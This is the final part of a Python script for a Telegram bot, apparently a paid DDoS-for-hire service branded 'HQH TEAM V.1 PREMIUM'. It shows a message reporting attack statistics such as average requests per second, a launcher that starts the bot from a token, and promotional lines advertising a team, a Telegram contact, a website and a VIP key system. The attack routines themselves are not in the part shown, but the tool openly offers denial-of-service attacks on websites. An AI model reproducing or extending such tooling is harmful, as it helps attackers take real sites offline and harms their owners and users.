• 🚀 Average RPS: {avg_rps:,.0f}
• ⏰ Total Time: {total_time:.1f}𝐬

📞 𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆 𝐁𝐎𝐓 𝐇𝐐𝐇 𝐕.𝟏 𝐏𝐑𝐄𝐌𝐈𝐔𝐌!
        """
        
        self.bot.send_message(chat_id, result)
        self.running = False
        self.current_attack = None

def main():
    if len(sys.argv) != 2:
        print("❌ Usage: python hqh_ddos_bot.py <bot_token>")
        print("💡 Get token from @BotFather")
        sys.exit(1)
    
    token = sys.argv[1]
    
    try:
        print("🦠 Starting BOT DDOS WEBSITE HQH TEAM V.1 PREMIUM...")
        bot = AdvancedTelegramDDoS(token)
        print("✅ Bot chạy thành công!")
        print("👥 Team: HQH LIMITED TEAM")
        print("📱 Telegram: @eneyota")
        print("🌐 Website: https://darkstack.online")
        print("💰 VIP System: ACTIVE")
        print("🔑 Private Keys: phần này để hiện key vip cho admin nếu bạn sở hữu scr !")
        bot.bot.polling(none_stop=True)
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()